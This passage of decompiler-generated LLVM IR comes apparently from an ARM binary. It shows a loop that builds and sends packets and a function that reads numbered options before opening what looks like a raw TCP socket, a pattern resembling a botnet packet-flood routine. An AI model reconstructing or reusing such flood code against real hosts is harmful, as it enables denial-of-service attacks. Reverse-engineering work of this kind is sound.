  %v1_b140 = trunc i32 %v5_b13c to i8
  store i8 %v1_b140, i8* %v2_b130, align 1
  store i32 %v1_aca4, i32* %r1.global-to-local, align 4
  %v0_b148 = load i32, i32* @r8, align 4
  %v1_b148 = add i32 %v0_b148, 13
  %v2_b148 = inttoptr i32 %v1_b148 to i8*
  %v3_b148 = load i8, i8* %v2_b148, align 1
  %v4_b148 = zext i8 %v3_b148 to i32
  store i32 %v1_b14c, i32* %r2.global-to-local, align 4
  %v1_b150 = and i32 %v4_b148, 253
  %v4_b154 = or i32 %v1_b150, %v3_b154
  store i32 %v4_b154, i32* %r3.global-to-local, align 4
  %v1_b158 = trunc i32 %v4_b154 to i8
  store i8 %v1_b158, i8* %v2_b148, align 1
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_b160 = load i32, i32* @r8, align 4
  %v1_b160 = add i32 %v0_b160, 13
  %v2_b160 = inttoptr i32 %v1_b160 to i8*
  %v3_b160 = load i8, i8* %v2_b160, align 1
  %v4_b160 = zext i8 %v3_b160 to i32
  %v1_b168 = and i32 %v4_b160, 254
  store i32 %v1_b168, i32* %r2.global-to-local, align 4
  %v2_b16c = or i32 %v1_b168, %v1_b164
  store i32 %v2_b16c, i32* %r3.global-to-local, align 4
  %v1_b170 = trunc i32 %v2_b16c to i8
  store i8 %v1_b170, i8* %v2_b160, align 1
  %v3_b174 = load i32, i32* @r8, align 4
  %v4_b174 = add i32 %v3_b174, 14
  %v5_b174 = inttoptr i32 %v4_b174 to i16*
  store i16 %v1_b0e0, i16* %v5_b174, align 2
  store i32 %v6_acdc, i32* %r1.global-to-local, align 4
  %v0_b17c = load i32, i32* @r4, align 4
  %v1_b17c = add i32 %v0_b17c, 40
  store i32 %v1_b17c, i32* %r0.global-to-local, align 4
  %v2_b180 = inttoptr i32 %v1_b17c to i16*
  %v3_b180 = call i32 @function_e228(i16* %v2_b180, i32 %v6_acdc)
  store i32 %v3_b180, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aed4

dec_label_pc_b188:                                ; preds = %dec_label_pc_ad48
  store i32 %v6_acdc, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_acdc, 40
  br label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_b188
  %storemerge6.pre-phi = phi i32 [ %v1_afd8, %dec_label_pc_aee8 ], [ %.pre, %dec_label_pc_b188 ]
  %v0_b1ac26 = phi i32 [ %v1_aedc, %dec_label_pc_aee8 ], [ 0, %dec_label_pc_b188 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_acdc, 65536
  %storemerge = add i32 %v6_acdc, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b198 = add i32 %storemerge4, 1310720
  store i32 %v1_b198, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b198, 256
  %v3_b1a0 = and i32 %tmp83, 65280
  store i32 %v3_b1a0, i32* %r3.global-to-local, align 4
  %v4_b1a4 = udiv i32 %v1_b198, 16777216
  %v5_b1a4 = or i32 %v3_b1a0, %v4_b1a4
  store i32 %v5_b1a4, i32* @r8, align 4
  %v2_b2d0 = icmp eq i32 %v1_acfc, 0
  br label %dec_label_pc_b1a8

dec_label_pc_b1a8:                                ; preds = %dec_label_pc_b1a8, %dec_label_pc_b2b4, %dec_label_pc_b198
  %v0_b1ac = phi i32 [ %v0_b1ac26, %dec_label_pc_b198 ], [ 0, %dec_label_pc_b2b4 ], [ 0, %dec_label_pc_b1a8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ac = icmp eq i32 %v0_b1ac, 0
  store i1 %v2_b1ac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ac, label %dec_label_pc_b1a8, label %dec_label_pc_b1b8

dec_label_pc_b1b8:                                ; preds = %dec_label_pc_b1a8, %dec_label_pc_b2b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1bc

dec_label_pc_b1bc:                                ; preds = %dec_label_pc_b1e4, %dec_label_pc_b1b8
  %v1_b1c4 = phi i32 [ %v1_b2a4, %dec_label_pc_b1e4 ], [ 0, %dec_label_pc_b1b8 ]
  store i32 %v2_ab68, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b1c4 = mul i32 %v1_b1c4, 4
  %v5_b1c4 = add i32 %v4_b1c4, %v2_ab68
  %v6_b1c4 = inttoptr i32 %v5_b1c4 to i32*
  %v7_b1c4 = load i32, i32* %v6_b1c4, align 4
  store i32 %v7_b1c4, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b1cc = load i32, i32* @fp, align 4
  %v9_b1cc = icmp eq i32 %v0_b1cc, 65535
  store i1 %v9_b1cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b1d0 = add i32 %v7_b1c4, 20
  store i32 %v1_b1d0, i32* @r5, align 4
  br i1 %v9_b1cc, label %dec_label_pc_b2c8, label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_b1bc
  store i32 %v1_acfc, i32* %r3.global-to-local, align 4
  store i1 %v2_b2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2d0, label %dec_label_pc_b1e4, label %dec_label_pc_b2dc

dec_label_pc_b1e4:                                ; preds = %dec_label_pc_b1d8, %dec_label_pc_b2c8, %dec_label_pc_b2dc
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b1e8 = load i32, i32* @r4, align 4
  %v3_b1e8 = add i32 %v2_b1e8, 10
  %v4_b1e8 = inttoptr i32 %v3_b1e8 to i16*
  store i16 0, i16* %v4_b1e8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b1f0 = load i32, i32* @r4, align 4
  store i32 %v0_b1f0, i32* @r0, align 4
  %v2_b1f4 = call i32 @function_c848(i32 %v0_b1f0, i32 20)
  %v3_b1f4 = trunc i32 %v2_b1f4 to i16
  store i32 %v2_b1f4, i32* %r0.global-to-local, align 4
  %v3_b1f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab58, i32* %r2.global-to-local, align 4
  %v3_b200 = mul i32 %v3_b1f8, 16
  %v2_b204 = add i32 %v3_b200, %v2_ab58
  store i32 %v2_b204, i32* %r1.global-to-local, align 4
  %v1_b208 = add i32 %v2_b204, 4
  %v2_b208 = inttoptr i32 %v1_b208 to i32*
  %v3_b208 = load i32, i32* %v2_b208, align 4
  %v3_b20c = mul i32 %v3_b208, 65536
  store i32 %v3_b20c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b208, 256
  %v1_b214 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b208, 256
  %v4_b218 = urem i32 %tmp86, 256
  %v5_b218 = or i32 %v4_b218, %v1_b214
  store i32 %v5_b218, i32* %r3.global-to-local, align 4
  %v1_b21c = add i32 %v3_b208, 1
  store i32 %v1_b21c, i32* %r2.global-to-local, align 4
  store i32 %v1_b21c, i32* %v2_b208, align 4
  %v0_b224 = load i32, i32* %r3.global-to-local, align 4
  %v1_b224 = load i32, i32* @r5, align 4
  %v2_b224 = add i32 %v1_b224, 4
  %v3_b224 = inttoptr i32 %v2_b224 to i32*
  store i32 %v0_b224, i32* %v3_b224, align 4
  %v0_b228 = load i32, i32* %r1.global-to-local, align 4
  %v1_b228 = add i32 %v0_b228, 8
  %v2_b228 = inttoptr i32 %v1_b228 to i32*
  %v3_b228 = load i32, i32* %v2_b228, align 4
  %tmp87 = mul i32 %v3_b228, 256
  %v1_b234 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b228, 256
  %v4_b238 = urem i32 %tmp88, 256
  %v5_b238 = or i32 %v4_b238, %v1_b234
  %v1_b23c = load i32, i32* @r5, align 4
  %v2_b23c = add i32 %v1_b23c, 8
  %v3_b23c = inttoptr i32 %v2_b23c to i32*
  store i32 %v5_b238, i32* %v3_b23c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b244 = load i32, i32* @r4, align 4
  %v4_b244 = add i32 %v3_b244, 10
  %v5_b244 = inttoptr i32 %v4_b244 to i16*
  store i16 %v3_b1f4, i16* %v5_b244, align 2
  %v0_b248 = load i32, i32* @r5, align 4
  store i32 %v0_b248, i32* @r1, align 4
  %v0_b24c = load i32, i32* %r3.global-to-local, align 4
  %v1_b24c = trunc i32 %v0_b24c to i16
  %v3_b24c = add i32 %v0_b248, 16
  %v4_b24c = inttoptr i32 %v3_b24c to i16*
  store i16 %v1_b24c, i16* %v4_b24c, align 2
  %v0_b250 = load i32, i32* @r8, align 4
  store i32 %v0_b250, i32* %r2.global-to-local, align 4
  %v0_b254 = load i32, i32* @sl, align 4
  store i32 %v0_b254, i32* %r3.global-to-local, align 4
  %v0_b258 = load i32, i32* @r4, align 4
  store i32 %v0_b258, i32* %r0.global-to-local, align 4
  %v4_b25c = call i32 @function_c898(i32 %v0_b258, i32 %v0_b248, i32 %v0_b250, i32 %v0_b254)
  %v5_b25c = trunc i32 %v4_b25c to i16
  store i32 %v4_b25c, i32* %r0.global-to-local, align 4
  %v3_b260 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b260, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b268 = mul i32 %v3_b260, 32
  store i32 %v3_b268, i32* %lr.global-to-local, align 4
  %v3_b26c = load i32, i32* @r5, align 4
  %v4_b26c = add i32 %v3_b26c, 16
  %v5_b26c = inttoptr i32 %v4_b26c to i16*
  store i16 %v5_b25c, i16* %v5_b26c, align 2
  %v0_b270 = load i32, i32* %lr.global-to-local, align 4
  %v1_b270 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b270, -8
  %v5_b270 = add i32 %v0_b270, %tmp105
  store i32 %v5_b270, i32* %lr.global-to-local, align 4
  %v0_b274 = load i32, i32* @r5, align 4
  %v1_b274 = add i32 %v0_b274, 2
  %v2_b274 = inttoptr i32 %v1_b274 to i16*
  %v3_b274 = load i16, i16* %v2_b274, align 2
  %v1_b278 = load i32, i32* %ip.global-to-local, align 4
  %v2_b278 = add i32 %v1_b278, %v5_b270
  store i32 %v2_b278, i32* @lr, align 4
  %v3_b27c = add i32 %v2_b278, 2
  %v4_b27c = inttoptr i32 %v3_b27c to i16*
  store i16 %v3_b274, i16* %v4_b27c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b288 = load i32, i32* @r4, align 4
  store i32 %v0_b288, i32* %r1.global-to-local, align 4
  %v0_b28c = load i32, i32* @sb, align 4
  store i32 %v0_b28c, i32* %r0.global-to-local, align 4
  %v0_b290 = load i32, i32* @r7, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @lr, align 4
  %v6_b29c = call i32 @function_11338(i32 %v0_b28c, i32 %v0_b288, i32 %v0_b290, i32 16384, i32 %v0_b294, i32 16)
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  %v1_b2a4 = add i32 %v3_b2a0, 1
  store i32 %v1_b2a4, i32* %r0.global-to-local, align 4
  %v0_b2a8 = load i32, i32* @r6, align 4
  %v9_b2a8 = icmp eq i32 %v0_b2a8, %v1_b2a4
  store i1 %v9_b2a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2a4, i32* %stack_var_-44, align 4
  %v8_b2b0 = icmp sgt i32 %v0_b2a8, %v1_b2a4
  br i1 %v8_b2b0, label %dec_label_pc_b1bc, label %dec_label_pc_b2b4

dec_label_pc_b2b4:                                ; preds = %dec_label_pc_b1e4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2b8 = icmp eq i32 %v0_b2a8, 0
  store i1 %v2_b2b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2b8, label %dec_label_pc_b1a8, label %dec_label_pc_b1b8

dec_label_pc_b2c8:                                ; preds = %dec_label_pc_b1bc
  %v0_b2c8 = call i32 @function_e094()
  %v1_b2c8 = trunc i32 %v0_b2c8 to i16
  store i32 %v0_b2c8, i32* %r0.global-to-local, align 4
  store i32 %v1_acfc, i32* %r3.global-to-local, align 4
  store i1 %v2_b2d0, i1* %cpsr_z.global-to-local, align 1
  %v3_b2d4 = load i32, i32* @r4, align 4
  %v4_b2d4 = add i32 %v3_b2d4, 4
  %v5_b2d4 = inttoptr i32 %v4_b2d4 to i16*
  store i16 %v1_b2c8, i16* %v5_b2d4, align 2
  br i1 %v2_b2d0, label %dec_label_pc_b1e4, label %dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge

dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge:    ; preds = %dec_label_pc_b2c8
  %v0_b2dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b2dc

dec_label_pc_b2dc:                                ; preds = %dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge, %dec_label_pc_b1d8
  %v0_b2dc = phi i32 [ %v0_b2dc.pre, %dec_label_pc_b2c8.dec_label_pc_b2dc_crit_edge ], [ %v7_b1c4, %dec_label_pc_b1d8 ]
  %v1_b2dc = add i32 %v0_b2dc, 40
  store i32 %v1_b2dc, i32* %r0.global-to-local, align 4
  store i32 %v6_acdc, i32* %r1.global-to-local, align 4
  %v2_b2e4 = inttoptr i32 %v1_b2dc to i16*
  %v3_b2e4 = call i32 @function_e228(i16* %v2_b2e4, i32 %v6_acdc)
  store i32 %v3_b2e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1e4

; uselistorder directives
  uselistorder i32 %v0_b2c8, { 1, 0 }
  uselistorder i32 %v1_b2a4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b270, { 1, 0 }
  uselistorder i32 %v4_b25c, { 1, 0 }
  uselistorder i32 %v3_b228, { 1, 0 }
  uselistorder i32 %v3_b208, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b1f4, { 1, 0 }
  uselistorder i1 %v2_b2d0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b0e0, { 1, 0 }
  uselistorder i32 %v0_b018, { 1, 0 }
  uselistorder i32 %v5_afac, { 1, 0 }
  uselistorder i32 %v0_af6c, { 1, 0 }
  uselistorder i32 %v0_af28, { 1, 2, 0, 3 }
  uselistorder i32 %v1_aed8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_aec4, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae50, { 1, 0 }
  uselistorder i32 %v6_ae48, { 0, 2, 1, 3 }
  uselistorder i1 %v9_ae78, { 1, 0 }
  uselistorder i32 %v4_ae8c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_add4, { 1, 0, 2 }
  uselistorder i32 %v0_af84, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_adc4, { 1, 0 }
  uselistorder i1 %v7_adbc, { 1, 0, 2 }
  uselistorder i1 %v7_ad70, { 1, 0 }
  uselistorder i32 %v3_ad6c, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b14c, { 1, 0 }
  uselistorder i32 %v1_b134, { 1, 0 }
  uselistorder i32 %v1_b11c, { 1, 0 }
  uselistorder i32 %v1_b104, { 1, 0 }
  uselistorder i32 %v1_b0ec, { 1, 0 }
  uselistorder i32 %v3_ae84, { 1, 0 }
  uselistorder i1 %v2_aea0, { 1, 0 }
  uselistorder i32 %v1_ae9c, { 1, 0 }
  uselistorder i32 %v4_ae98, { 2, 0, 1 }
  uselistorder i32 %v2_adac, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad48, { 1, 0 }
  uselistorder i1 %v7_ad40, { 1, 0 }
  uselistorder i1 %v7_ad14, { 1, 0 }
  uselistorder i32 %v3_ad10, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_acfc, { 2, 3, 1, 0 }
  uselistorder i32 %v6_acdc, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v1_ac44, { 1, 0 }
  uselistorder i32 %v1_ac24, { 1, 0 }
  uselistorder i32 %v6_ac00, { 1, 0 }
  uselistorder i32 %v1_abe8, { 1, 0 }
  uselistorder i8 %v5_aba0, { 1, 0 }
  uselistorder i32 %v6_ab80, { 1, 0 }
  uselistorder i32 %v2_ab68, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab58, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 20, 17, 18, 19, 22, 21, 23, 26, 25, 24, 27, 28, 29, 31, 32, 30, 33, 35, 34, 36, 37, 38, 40, 39, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1b8, { 1, 0 }
  uselistorder label %dec_label_pc_b1a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b198, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aed4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae10, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_adf0, { 1, 0 }
  uselistorder label %dec_label_pc_adcc, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_ad7c, { 1, 0 }
  uselistorder label %dec_label_pc_ad60, { 1, 0 }
}

define i32 @function_b2f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b2f0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b2f0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b30c = call i32 @function_11f24(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b318 = load i32, i32* @r6, align 4
  store i32 %v0_b318, i32* %r0.global-to-local, align 4
  %v2_b31c = call i32 @function_11f24(i32 %v0_b318, i32 4)
  %v0_b320 = load i32, i32* @r5, align 4
  store i32 %v0_b320, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b330 = load i32, i32* @r4, align 4
  store i32 %v0_b330, i32* %r0.global-to-local, align 4
  %v5_b334 = inttoptr i32 %v0_b320 to i32*
  %v6_b334 = call i32 @function_8570(i32 %v0_b330, i32* %v5_b334, i32 2, i32 0)
  %v1_b340 = urem i32 %v6_b334, 256
  store i32 %v1_b340, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b34c = load i32, i32* @r5, align 4
  store i32 %v0_b34c, i32* %r1.global-to-local, align 4
  %v0_b350 = load i32, i32* @r4, align 4
  store i32 %v0_b350, i32* %r0.global-to-local, align 4
  %v5_b354 = trunc i32 %v6_b334 to i8
  %v6_b358 = inttoptr i32 %v0_b34c to i32*
  %v7_b358 = call i32 @function_8570(i32 %v0_b350, i32* %v6_b358, i32 3, i32 65535)
  %v0_b35c = load i32, i32* @r5, align 4
  store i32 %v0_b35c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b358, i32* @r7, align 4
  %v0_b36c = load i32, i32* @r4, align 4
  store i32 %v0_b36c, i32* %r0.global-to-local, align 4
  %v4_b370 = inttoptr i32 %v0_b35c to i32*
  %v5_b370 = call i32 @function_8570(i32 %v0_b36c, i32* %v4_b370, i32 4, i32 64)
  %v1_b378 = urem i32 %v5_b370, 256
  store i32 %v1_b378, i32* %ip.global-to-local, align 4
  %v0_b37c = load i32, i32* @r5, align 4
  store i32 %v0_b37c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b388 = load i32, i32* @r4, align 4
  store i32 %v0_b388, i32* %r0.global-to-local, align 4
  %v6_b390 = inttoptr i32 %v0_b37c to i32*
  %v7_b390 = call i32 @function_8570(i32 %v0_b388, i32* %v6_b390, i32 5, i32 1)
  %v1_b39c = urem i32 %v7_b390, 256
  store i32 %v1_b39c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3a4 = load i32, i32* @r5, align 4
  store i32 %v0_b3a4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v5_b3b4 = inttoptr i32 %v0_b3a4 to i32*
  %v6_b3b4 = call i32 @function_8570(i32 %v0_b3ac, i32* %v5_b3b4, i32 7, i32 65535)
  %v0_b3b8 = load i32, i32* @r5, align 4
  store i32 %v0_b3b8, i32* %r1.global-to-local, align 4
  %v3_b3bc = mul i32 %v6_b3b4, 65536
  store i32 %v3_b3bc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v3_b3cc = urem i32 %v6_b3b4, 65536
  store i32 %v3_b3cc, i32* @sl, align 4
  %v4_b3d0 = inttoptr i32 %v0_b3b8 to i32*
  %v5_b3d0 = call i32 @function_8570(i32 %v0_b3c8, i32* %v4_b3d0, i32 11, i32 0)
  %v1_b3d8 = urem i32 %v5_b3d0, 256
  store i32 %v1_b3d8, i32* %ip.global-to-local, align 4
  %v0_b3dc = load i32, i32* @r5, align 4
  store i32 %v0_b3dc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3e8 = load i32, i32* @r4, align 4
  store i32 %v0_b3e8, i32* %r0.global-to-local, align 4
  %v5_b3f0 = inttoptr i32 %v0_b3dc to i32*
  %v6_b3f0 = call i32 @function_8570(i32 %v0_b3e8, i32* %v5_b3f0, i32 12, i32 1)
  %v1_b3f8 = urem i32 %v6_b3f0, 256
  store i32 %v1_b3f8, i32* %ip.global-to-local, align 4
  %v0_b3fc = load i32, i32* @r5, align 4
  store i32 %v0_b3fc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v5_b410 = inttoptr i32 %v0_b3fc to i32*
  %v6_b410 = call i32 @function_8570(i32 %v0_b408, i32* %v5_b410, i32 13, i32 1)
  %v1_b418 = urem i32 %v6_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @function_8570(i32 %v0_b428, i32* %v5_b430, i32 14, i32 0)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @function_8570(i32 %v0_b448, i32* %v5_b450, i32 15, i32 0)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @function_8570(i32 %v0_b468, i32* %v5_b470, i32 16, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b484 = load i32, i32* @r5, align 4
  store i32 %v0_b484, i32* %r1.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b490 = inttoptr i32 %v0_b484 to i32*
  %v6_b490 = call i32 @function_8570(i32 %v0_b488, i32* %v5_b490, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r5, align 4
  store i32 %v0_b4a0, i32* %r1.global-to-local, align 4
  %v0_b4a4 = load i32, i32* @r4, align 4
  store i32 %v0_b4a4, i32* %r0.global-to-local, align 4
  %v4_b4a8 = inttoptr i32 %v0_b4a0 to i32*
  %v5_b4a8 = call i32 @function_8570(i32 %v0_b4a4, i32* %v4_b4a8, i32 1, i32 1)
  %v1_b4b0 = urem i32 %v5_b4a8, 256
  store i32 %v1_b4b0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b4c4 = call i32 @function_113bc(i32 2, i32 3, i32 6)
  store i32 %v3_b4c4, i32* %r0.global-to-local, align 4
  %v7_b4c8 = icmp eq i32 %v3_b4c4, -1
  store i1 %v7_b4c8, i1* %cpsr_z.global-to-local, align 1
